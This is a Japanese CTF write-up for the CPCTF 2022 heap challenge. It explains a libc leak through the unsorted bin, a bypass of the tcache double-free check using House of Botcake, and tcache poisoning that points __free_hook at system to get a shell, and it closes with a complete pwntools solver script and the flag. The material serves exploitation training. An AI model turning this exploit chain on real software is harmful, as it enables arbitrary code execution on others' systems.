---
title: "heap_challenge - CPCTF 2022"
date: 2022-05-08T21:40:32+09:00
tags: ["pwn", "CPCTF"]
draft: false
---

# 方針
unsorted binによるlibc leakと、House of botcake

## 事前準備
```python
# def new(index: str, msg: str, content: bytes)
new("0", "16", b"AAAA")
new("1", "1280", b"BBBB")
new("2", "16", b"CCCC")
new("3", "16", b"DDDD")
new("4", "16", b"EEEE")
new("5", "16", b"FFFF")
```

## unsorted binによるlibc leakの旅

unsorted binの`fd`は、`main_arena.top`を指す。

`top`メンバの位置と、libcの中に置かれる`main_arena`の位置がわかれば、libc base addressを求めることができる。

（一度mallocしないとtopにアドレスが入らないので、そこまで進める。）

```none
gef➤  heap arena
Arena (base=0x7ffff7fc1b80, top=0x55555555b2d0, last_remainder=0x0, next=0x7ffff7fc1b80, next_free=0x0, system_mem=0x21000)
```

次に、libcの配置されている場所は`0x00007ffff7dd5000`である。

```none
gef➤  vm
:
0x00007ffff7dd5000 0x00007ffff7df7000 0x0000000000000000 r-- /ctf/yu1hpa/2022/CPCTF/heap_chal/libc.so.6
```

したがって、`main_arena`とのオフセットは、
```none
0x7ffff7fc1b80 - 0x00007ffff7dd5000 = 0x1ecb80
```

また、`top`メンバの位置は次のように確認することができる。
```none
gef➤  x/16xg 0x7ffff7fc1b80
0x7ffff7fc1b80: 0x0000000000000000      0x0000000000000000
0x7ffff7fc1b90: 0x0000000000000000      0x0000000000000000
0x7ffff7fc1ba0: 0x0000000000000000      0x0000000000000000
0x7ffff7fc1bb0: 0x0000000000000000      0x0000000000000000
0x7ffff7fc1bc0: 0x0000000000000000      0x0000000000000000
0x7ffff7fc1bd0: 0x0000000000000000      0x0000000000000000
0x7ffff7fc1be0: 0x000055555555b2d0      0x0000000000000000
0x7ffff7fc1bf0: 0x00007ffff7fc1be0      0x00007ffff7fc1be0
```
`top=0x55555555b2d0`は`main_arena(0x7ffff7fc1b80)`<+96> の位置にあることがわかるので、libc base addressは以下のように求まる。

```none
main_arena.top = libc_base_address + offset_main_arena + offset_top
libc_base_address = main_arena.top - offset_main_arena - offset_top
                  = main_arena.top - 0x1ecb80 - 0x60
```

### main_arena.topをリーク
このプログラムには、二箇所に`free`できる場所がある。
一つは、`delete`関数で、もう一つは`edit`関数である。

```c
void edit() {
  printf("index> ");
  int index = get_int();
    //（中略）

  free(msg[index]->content); // here
    //（中略）
}

void delete() {
  printf("index> ");
  int index = get_int();
    //（中略）

  free(msg[index]->content); // here
  free(msg[index]); // here
}
```

#### 失敗例
unsorted binにつながるチャンクを`delete`する前
```none
gef➤  x/16xg 0x000055555555b2d0
0x55555555b2d0: 0x0000000000000000      0x0000000000000021
0x55555555b2e0: 0x0000000000000500      0x000055555555b300
0x55555555b2f0: 0x0000000000000000      0x0000000000000511
0x55555555b300: 0x0000000a42424242      0x0000000000000000
```

`delete`したあと

```none
gef➤  x/16xg 0x000055555555b2d0
0x55555555b2d0: 0x0000000000000000      0x0000000000000021
0x55555555b2e0: 0x0000000000000000      0x000055555555b010
0x55555555b2f0: 0x0000000000000000      0x0000000000000511
0x55555555b300: 0x00007ffff7fc1be0      0x00007ffff7fc1be0
```

```none
puts@plt (
   $rdi = 0x000055555555b010 → 0x0000000000000001,
   $rsi = 0x00000000ffffffda,
   $rdx = 0x0000000000000008
)
```

`delete`したあと、`0x55555555b300`にlibc内のアドレスがあるのだが、puts()が`0x000055555555b010`を指してしまっているので、リークできない。

#### 成功例
`edit`関数の中で以下の処理がある。

```c
void edit() {
  printf("index> ");
  int index = get_int();
    //（中略）
  free(msg[index]->content);
  
  printf("new_len> ");
  int new_len = get_int();
  
  if(new_len <= 0){
    puts("invalid length");
    return;
  }
```
indexにinvalid length(`-1`など)の値を与えると、`msg[index]->content`だけをfreeする。
そうすると、puts()が`0x000055555555b300`を指してくれるので、libc leakできる。

```none
puts@plt (
   $rdi = 0x000055555555b300 → 0x00007ffff7fc1be0 → 0x000055555555b840 → 0x0000000000000000,
   $rsi = 0x00000000ffffffda,
   $rdx = 0x0000000000000008
)
```

### libc leakのパート
```python
new("0", "16", b"AAAA")
new("1", "1280", b"BBBB")
new("2", "16", b"CCCC")

edit("1", "-1")
show("1")
libc.address = u64(io.recvline()[:-1].ljust(8, b"\0")) - arena_top
```

## House of botcakeによってdouble free detectedを回避

まず、glibc-2.28から`tcache_entry`にkeyというメンバが追加されていて、double freeをすると、検知されるようになっている。
それを回避する方法が、`House of botcake`である。

要するに、`key`が`tcache`でなければ、`double free detected`は起きないだろうということである。([malloc.c#L4193](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4193))

```c
if (__glibc_unlikely (e->key == tcache))
  {
    tcache_entry *tmp;
    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
    for (tmp = tcache->entries[tc_idx];
	 tmp;
	 tmp = tmp->next)
      if (tmp == e)
	malloc_printerr ("free(): double free detected in tcache 2");
    /* If we get here, it was a coincidence.  We've wasted a
       few cycles, but don't abort.  */
  }
```

### tcacheをすべて埋める
7つの`tcache`をすべて埋めて、次にfreeしたチャンクが`fastbin`に繋がるようにします。

`delete`は、`msg[index]->content`と`msg[index]`をfreeするので2つ繋がれて、`edit`は1つである。
（また表記として、`msg[index]->content`には、ダッシュ`'`を付けます）

```python
delete("0")
delete("2")
delete("3")
edit("4", "-1")
```
```none
tcache: 4' -> 3 -> 3' -> 2 -> 2' -> 0 -> 0' -> NULL
```
### double free
double freeについては、[fastbin_tutorial - InterKosenCTF 2019](https://blog.y2a.dev/articles/2022/05-07/fastbin_tutorial/)で詳しく説明しているので、わからなければ合わせて確認してみてください。

さて、fastbinの中でdouble freeを起こします。
```python
delete("5") #fastbin: 5 -> 5' -> NULL
edit("5", "-1") #fastbin: 5' -> 5 -> 5' -> NULL
```

そのあと、`tcache`に溜まっているfreed chunkを無くしていきます。
```python
new("0", "16", b"XXXX")
new("2", "16", b"YYYY")
new("3", "16", b"ZZZZ")
```
そうするとbinの様子は次のようになります。
```none
tcache: 0' -> NULL
fastbin: 5' -> 5 -> 5' -> NULL
```

#### tcache poisoning
ここで`new`すると、`tcache`と`fastbin`から一つずつ確保され、`content`には`5'`のアドレスが返ります。
```python
new("4", "16", p64(libc.sym["__free_hook"]))
```
```none
fastbin: NULL
tcache: 5 -> 5' -> __free_hook -> NULL
```
#### freed chunkの調整
このままでは、うまく`__free_hook`が返ってこないので、`edit`を使って、freed chunkを一つ付け足します。
```none
tcache: 0' -> 5 -> 5' -> __free_hook -> NULL
```

あとは、`__free_hook`を`system`に向けて`system("/bin/sh")`を呼びます。

# [Solver](https://github.com/yu1hpa/ctf-writeup/tree/master/2022/CPCTF/heap_challenge)
```python
from pwn import *

HOST = "heap-challenge.cpctf.space"
PORT = 30018
file = "./heap_chal"
libc = ELF("./libc.so.6")
context(os = 'linux', arch = 'amd64')
#context.log_level = 'debug'

io = process(file)

arena_top = 0x1ecb80 + 0x60


def new(index: str, msg: str, content: bytes):
    io.sendlineafter(">", "1")
    io.sendlineafter("index> ", index)
    io.sendlineafter("msg_len> ", msg)
    io.sendlineafter("content> ", content)

def edit(index: str, newlen: str, content: bytes =b""):
    io.sendlineafter(">", "2")
    io.sendlineafter("index> ", index)
    io.sendlineafter("new_len> ", newlen)
    if b"inv" in io.recvn(3):
        return
    io.sendlineafter("> ", content)

def show(index: str):
    io.sendlineafter(">", "3")
    io.sendlineafter("index> ", index)

def delete(index: str):
    io.sendlineafter(">", "4")
    io.sendlineafter("index> ", index)

new("0", "16", b"AAAA")
new("1", "1280", b"BBBB")
new("2", "16", b"CCCC")
new("3", "16", b"DDDD")
new("4", "16", b"EEEE")
new("5", "16", b"FFFF")

# leak libc
edit("1", "-1")
show("1")
libc.address = u64(io.recvline()[:-1].ljust(8, b"\0")) - arena_top
libc_free_hook = libc.sym['__free_hook']
print(f'{libc.address:x}')
print(f'{libc_free_hook:x}')

# fill tcache
delete("0")
delete("2")
delete("3")
edit("4", "-1")

# double free
delete("5") #fastbin: 5 -> 5' -> NULL
edit("5", "-1") #fastbin: 5' -> 5 -> 5' -> NULL

new("0", "16", b"XXXX")
new("2", "16", b"YYYY")
new("3", "16", b"ZZZZ")

# tcache: 0' -> NULL
# fastbin: 5' -> 5 -> 5' -> NULL
new("4", "16", p64(libc.sym["__free_hook"])) # 4 = 5'
# tcache: 5 -> 5' -> __free_hook -> NULL

edit("0", "-1") # tcache: 0' -> 5 -> 5' -> __free_hook -> NULL
new("5", "16", b"/bin/sh\x00") # tcache: 5' -> __free_hook -> NULL
new("6", "16", p64(libc.sym["system"]))

delete("5")

io.interactive()
#CPCTF{we_implemented_it_too_freely}
```



# 参考文献
https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c
